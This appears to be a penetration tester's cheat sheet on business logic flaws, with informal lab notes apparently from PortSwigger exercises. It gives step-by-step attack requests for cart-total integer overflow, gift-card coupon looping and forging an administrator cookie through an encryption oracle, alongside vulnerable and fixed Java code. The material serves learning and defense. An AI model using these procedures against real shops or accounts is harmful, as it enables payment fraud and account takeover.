tactic: Privilege Escalation


**Business Logic Flaws** are vulnerabilities that arise from flawed assumptions in the application's workflow rather than from classic injection or parsing bugs. The application works exactly as coded  the code itself is wrong. These require understanding what the application is supposed to do, then finding where those assumptions break.

```
Developer assumes:  quantity will always be between 1 and 99
Attacker does:      sends quantity=100, or repeats additions to overflow
Result:             price wraps to negative, item is free or pays the attacker
```

These flaws are not caught by automated scanners because they require understanding business context


## Injection Points

- Cart quantity fields
- Coupon and discount application endpoints
- Price and total calculation logic
- Checkout and order confirmation flows
- Account balance and credit systems
- Gift card purchase and redemption flows
- Signup and promotional reward flows
- Cookie values encoding session or role data
- Any multi-step workflow where steps can be skipped or manipulated

---

## Checklist

### General Approach

- [ ]  Map the intended workflow completely first — understand every step
- [ ]  Test boundary values: 0, -1, max integer, max+1, very large numbers
- [ ]  Try skipping steps in multi-step flows — submit the final step directly
- [ ]  Try repeating steps that should only run once
- [ ]  Try submitting inconsistent combinations (e.g. currency mismatch, different user IDs in same session)
- [ ]  Test what happens when you apply discounts before and after adding items

### Low-Level Logic Flaw (Integer Overflow / Quantity Abuse)

- [ ]  Find the maximum quantity allowed per request (e.g. 99)
- [ ]  Add the maximum quantity to cart, then send one more request — does it accept 100?
- [ ]  If there is a per-request limit but no total limit, use Burp Intruder to add large quantities:

```
	POST /cart
	productId=1&redir=PRODUCT&quantity=99
```

```
Repeat until total quantity is so large the total price overflows to negative
```

- [ ]  Once total is negative, add enough of a cheap item to bring the balance back to near zero:

```
	Keep adding cheap items until total ≈ $0 or just below
```

- [ ]  Check out with a negative or near-zero total

**The flow:**

```
1. Add expensive item × 99 (max per request)
2. Repeat step 1 until cart total approaches max integer (~$2,000,000+)
3. Cart total overflows → becomes negative
4. Add cheap items until total reaches $0-$10
5. Checkout at no cost
```

### Infinite Money / Coupon Abuse

- [ ]  Identify any flow that gives value repeatedly (newsletter signup coupon, referral bonus, gift card)
- [ ]  Find the discount coupon apply it to a gift card purchase:

```
	1. Buy a gift card with a 30% discount (e.g. $10 gift card for $7)
	2. Redeem the gift card for $10 credit
	3. Profit $3 per cycle
	4. Repeat until target balance reached
```

- [ ]  Automate with Burp Intruder:
    - Capture the gift card purchase and redeem requests
    - Use Intruder to replay the redeem code , set payload to extracted gift card codes from responses
    - This is faster than manual repetition for reaching a specific balance like $1337

### Encryption Oracle Abuse

The idea is to use the application's own encryption to forge a trusted cookie value.

- [ ]  Identify an encrypted cookie that encodes privileged information (e.g. `stay-logged-in` cookie in format `username:timestamp`)
- [ ]  Find a feature that encrypts arbitrary user input and returns it in a cookie (e.g. invalid email update stores the email in a `notification` cookie  encrypted)
- [ ]  Use that feature as an encryption oracle:

```
	1. Submit POST /my-account/change-email with email=administrator:TIMESTAMP
	   (match the format used by the stay-logged-in cookie)
	2. The app encrypts your input and returns it in the notification cookie
	3. URL decode → base64 decode the cookie value
	4. The format includes a prefix (e.g. "Invalid email address: ") before your input
	5. Count the prefix length in bytes (e.g. 23 bytes = "Invalid email address: ")
	6. Delete exactly those prefix bytes from the decoded value
	7. Re-base64 → re-URL encode the result
	8. Set that as your stay-logged-in cookie value
	9. Access /admin — you are now authenticated as administrator
```

**Step by step with the cookie:**

```
notification cookie:  %38%39%54... (URL encoded)
→ URL decode:         89TBpxGNOh2251Pa+I7mduYddwALAD+qK/R36pu1v8E=
→ base64 decode:      [encrypted bytes]
→ manually remove prefix bytes (23 bytes for "Invalid email address: ")
→ re-base64 encode
→ re-URL encode
→ set as stay-logged-in cookie
```

- [ ]  The prefix byte count can be confirmed by encrypting a known string and observing that the first N characters of the decrypted output match the prefix

### Skipping Workflow Steps

- [ ]  Identify multi-step processes (add to cart → checkout → payment → confirmation)
- [ ]  Try jumping directly to the confirmation/success endpoint without completing payment
- [ ]  Try submitting the final step with a manipulated state from the first step

### Inconsistent State Abuse

- [ ]  Apply a discount code, then change the items in the cart  does the discount persist?
- [ ]  Apply a discount valid for one product, swap to a different product at checkout
- [ ]  Change currency between steps if the app supports multiple currencies

---

## Attack Payloads

**Add max quantity repeatedly (Intruder null payload):**

```http
POST /cart HTTP/1.1

productId=1&redir=PRODUCT&quantity=99
```

Set Intruder to null payloads, repeat 500 times, then check cart total.

**Add cheap item to adjust negative total:**

```http
POST /cart HTTP/1.1

productId=2&redir=PRODUCT&quantity=1
```

Repeat until total reaches near $0.

**Gift card purchase with coupon:**

```http
POST /cart/coupon HTTP/1.1

csrf=TOKEN&coupon=SIGNUP30

POST /cart HTTP/1.1
productId=GIFTCARD_ID&redir=PRODUCT&quantity=1

POST /cart/checkout HTTP/1.1
csrf=TOKEN
```

**Encryption oracle — submit target value as email:**

```http
POST /my-account/change-email HTTP/1.1

email=administrator:1715000000000
```

Extract `notification` cookie → strip prefix bytes → use as `stay-logged-in` cookie.

---

## White Box Testing

**Vulnerable, no total price validation — integer overflow possible:**

```java
@PostMapping("/cart/checkout")
public ResponseEntity<?> checkout(@AuthenticationPrincipal UserDetails user) {
    Cart cart = cartService.getCart(user);

    // total calculated from stored cart items — no upper or lower bound check
    int total = cart.getItems().stream()
        .mapToInt(item -> item.getPrice() * item.getQuantity())
        .sum(); // overflows to negative if quantity is large enough

    if (total <= 0) {
        // negative total passes this check — order processed for free
        orderService.createOrder(cart, user);
        return ResponseEntity.ok("Order placed");
    }
    return ResponseEntity.ok("Order placed for $" + total);
}
```

**Vulnerable, coupon redeemed without checking if already used in this session:**

```java
@PostMapping("/cart/coupon")
public ResponseEntity<?> applyCoupon(@RequestParam String coupon,
                                      HttpSession session) {
    Coupon c = couponRepository.findByCode(coupon);
    if (c == null) return ResponseEntity.badRequest().build();

    // no check if this coupon was already applied in this session
    session.setAttribute("discount", c.getPercentage());
    return ResponseEntity.ok("Discount applied");
}
```

**Vulnerable, encryption oracle — user input encrypted and returned in cookie:**

```java
@PostMapping("/my-account/change-email")
public ResponseEntity<?> changeEmail(@RequestParam String email,
                                      HttpServletResponse response) {
    if (!isValidEmail(email)) {
        // encrypts the invalid email and returns it — oracle exposed
        String encrypted = encrypt("Invalid email address: " + email);
        response.addCookie(new Cookie("notification", URLEncoder.encode(encrypted)));
        return ResponseEntity.badRequest().build();
    }
    // ...
}
```

**Secure:**

```java
// Validate cart total server-side — reject if negative or suspiciously large
@PostMapping("/cart/checkout")
@Transactional
public ResponseEntity<?> checkout(@AuthenticationPrincipal UserDetails user) {
    Cart cart = cartService.getCart(user);
    long total = cart.getItems().stream()
        .mapToLong(item -> (long) item.getPrice() * item.getQuantity())
        .sum();

    if (total <= 0 || total > 1_000_000_00L) { // reject negative and unrealistic totals
        return ResponseEntity.badRequest().body("Invalid cart total");
    }

    // validate quantity per item too
    for (CartItem item : cart.getItems()) {
        if (item.getQuantity() <= 0 || item.getQuantity() > 99) {
            return ResponseEntity.badRequest().body("Invalid quantity");
        }
    }
    return ResponseEntity.ok(orderService.createOrder(cart, user));
}

// Track coupon usage per user in the database — not in session
@PostMapping("/cart/coupon")
public ResponseEntity<?> applyCoupon(@RequestParam String coupon,
                                      @AuthenticationPrincipal UserDetails user) {
    Coupon c = couponRepository.findByCode(coupon);
    if (c == null) return ResponseEntity.badRequest().build();

    // check if this user already used this coupon
    if (couponUsageRepository.existsByUserAndCoupon(user.getUsername(), coupon)) {
        return ResponseEntity.badRequest().body("Coupon already used");
    }
    couponUsageRepository.save(new CouponUsage(user.getUsername(), coupon));
    cartService.applyDiscount(user, c.getPercentage());
    return ResponseEntity.ok().build();
}

// Never use user-controlled data as oracle input for encryption
// If a notification is needed, store the message server-side and reference it by ID
@PostMapping("/my-account/change-email")
public ResponseEntity<?> changeEmail(@RequestParam String email,
                                      HttpSession session) {
    if (!isValidEmail(email)) {
        // store message server-side — never encrypt user input into a cookie
        session.setAttribute("notification", "Invalid email address");
        return ResponseEntity.badRequest().build();
    }
    // ...
}
```

---

## LABS

 **Low-level logic flaw**

we notice that when adding an item there is a limit of 99  but if we add 99 product then  the system flaws in letting me add 1 more

add alot till it cart arrives  2 million something after that the account goes in negative add enough items till the account balance arrives till 0 


``` HTTP
productId=1&redir=PRODUCT&quantity=1
```


**Infinite money logic flaw**

the glitch is basically signup newsletter gives u percentage of discount 30 % now buy a gift card and place the  discount in it repeat the process till u have 1337 

not use intruder to insert the redeem card code , this makes your life easier 


**Authentication bypass via encryption oracle**

notice that everytime we update the email when its invalid we have notification cookie  and when we write a `POST` the email gets envrypted so what awe do we enctypt `administrator:timestamp` since this format is based on the stay-login cookie in this format
notice that there is an invalid cookie decore url , base64 then delete it manually till we have the `admin:timestamp`

``` 
%38%39%54%42%70%78%47%4e%4f%68%32%32%35%31%50%61%2b%49%37%6d%64%75%59%64%64%77%41%4c%41%44%2b%71%4b%2f%52%33%36%70%75%31%76%38%45%3d
```

## Resources

- [PortSwigger Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [HackTricks Business Logic](https://book.hacktricks.xyz/pentesting-web/business-logic-vulnerabilities)
- [OWASP Business Logic](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)